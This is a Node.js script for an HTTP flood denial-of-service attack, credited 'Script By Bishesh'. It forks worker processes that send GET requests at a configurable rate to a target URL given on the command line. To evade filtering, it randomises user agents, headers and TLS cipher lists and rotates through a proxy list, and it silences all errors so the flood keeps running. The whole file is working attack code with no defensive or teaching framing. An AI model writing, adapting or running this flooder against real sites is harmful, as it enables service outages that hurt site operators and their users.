const url = require('url'),
      fs = require('fs'),
      http2 = require('http2'),
      http = require('http'),
      tls = require('tls'),
      net = require('net'),
      cluster = require('cluster'),
      randstr = require('randomstring');

const fakeua = require('fake-useragent');

const cplist = [
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

const accept_header = ['text/html', 'application/xhtml+xml', 'application/xml;q=0.9', 'image/webp', 'image/apng', '*/*;q=0.8', 'application/signed-exchange;v=b3'];
const lang_header = ['en-US', 'en;q=0.9', 'de-CH;q=0.7', 'en-GB', 'es;q=0.8'];
const encoding_header = ['gzip', 'deflate', 'br'];
const control_header = ['no-store', 'no-cache', 'must-revalidate', 'proxy-revalidate', 'max-age=0'];

process.on('uncaughtException', function (err) {})
       .on('unhandledRejection', function (reason, p) {})
       .on('exit', code => {});

function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
  return control_header[Math.floor(Math.random() * control_header.length)];
}

function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}

function ra(length) {
  return randstr.generate({'charset': '0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789', 'length': length});
}

function ra1() {
  return ra(0x19);
}

function ra2() {
  return ra(0x19);
}

function ra3() {
  return ra(0x19);
}

function ra4() {
  return ra(0x19);
}

function getRandomUserAgent() {
  return fakeua();
}

const target = process.argv[2],
      time = process.argv[3],
      thread = process.argv[4],
      rps = process.argv[5],
      proxys = fs.readFileSync(process.argv[6], 'utf8').trim().split(/\s+/);

function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
  console.log('\x1b[38;2;255;0;255m' + 'Script By Bishesh');
  console.log('\x1b[1m' + 'Attack sent all proxies to the website.');

  for (var bb = 0; bb < thread; bb++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(-1);
  }, time * 0x3e8);
} else {
  function flood() {
    const options = url.parse(target);
    options.method = 'GET';
    options.headers = {
      'Accept': accept(),
      'Accept-Language': lang(),
      'Accept-Encoding': encoding(),
      'Cache-Control': controling(),
      'User-Agent': getRandomUserAgent(),
      'Connection': 'close',
      'Pragma': 'no-cache',
    };

    if (proxys.length) {
      options.agent = new http.Agent({
        keepAlive: true,
        maxSockets: 256,
        timeout: 5e3,
        proxy: proxyr(),
      });
    } else {
      options.agent = new http.Agent({
        keepAlive: true,
        maxSockets: 256,
        timeout: 5e3,
      });
    }

    const req = http.request(options);
    req.end();
  }

  setInterval(() => {
    flood();
  }, 1000 / rps);
}
